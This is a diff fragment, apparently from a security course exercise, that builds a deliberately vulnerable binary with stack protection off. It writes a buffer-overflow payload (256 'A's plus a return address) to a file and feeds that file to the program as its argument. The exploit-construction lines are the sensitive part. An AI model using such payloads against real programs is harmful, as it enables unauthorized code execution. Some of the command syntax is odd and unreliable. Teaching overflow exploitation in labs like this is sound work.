@@ -17,7 +17,7 @@ gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -ggdb -o
 
 sudo echo $(python -c "print('A'*256+'\x00\x84\x04\x08')") > malicious_input_test
 
-./example3_korbi | cat Exercise5/malicious_input_test | id
+./example3_korbi $(cat Exercise5/malicious_input_test) id
 
 
 Exercise 6)
